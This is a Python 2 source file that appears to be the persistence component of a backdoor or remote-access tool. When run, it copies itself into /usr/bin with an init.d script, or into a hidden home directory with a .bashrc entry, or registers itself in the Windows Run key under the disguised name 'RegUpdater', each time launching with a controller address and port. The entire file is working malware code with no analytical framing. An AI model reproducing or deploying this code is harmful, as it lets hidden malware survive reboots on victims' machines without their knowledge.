import os, platform, getpass
import shutil

app_name = ''
user_name = ''


def linux_persistence():
    is_root_user = 'root' == user_name

    if is_root_user:
        script_name = '/etc/init.d/pstc'
        if not os.path.exists(script_name):
            with open(script_name, 'w') as f:
                f.write('#/bin/bash\n')
                f.write('python /usr/bin/%s 127.0.0.1 8686\n' % app_name)

            shutil.copy(app_name, '/usr/bin/'+app_name)
    else:
        home_path = os.environ.get('HOME')
        if home_path is None:
            pass
        else:
            hidden_path = home_path + '/.Q4dC12XfR/'
            if not os.path.exists(hidden_path):
                os.makedirs(hidden_path)

            if os.path.exists(hidden_path + app_name):
                return

            with open(home_path+'/.bashrc', 'a') as f:
                f.write('\npython %s%s 127.0.0.1 8686\n' % (hidden_path, app_name))

            shutil.copy(app_name, hidden_path + app_name)


def windows_persistence():
    import _winreg as wreg
    global app_name
    global user_name

    # check release
    release = platform.release()
    if '7' == release or '8' == release: # win7~
        dst_path = 'C:\\Users\\%s\\Documents\\%s' % (user_name, app_name)
    else:
        dst_path = 'C:\\Documents and Settings\\%s\\%s' % (user_name, app_name)

    if not os.path.exists(dst_path):
        try:
            key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0)
            wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, dst_path)
            key.Close()

            # copy after adding registry successfully
            shutil.copy(app_name, dst_path)
        except WindowsError:
            pass


def main():
    global app_name
    global user_name
    try:
        app_name = __file__
    except NameError:  # We are the main py2exe script, not a module
        import sys
        app_name = sys.argv[0]

    app_name = app_name.split('/')[-1]

    user_name = getpass.getuser()

    system = platform.system()
    if 'Linux' in system:
        linux_persistence()
    elif 'Windows' in system:
        windows_persistence()
    else:
        pass

main()
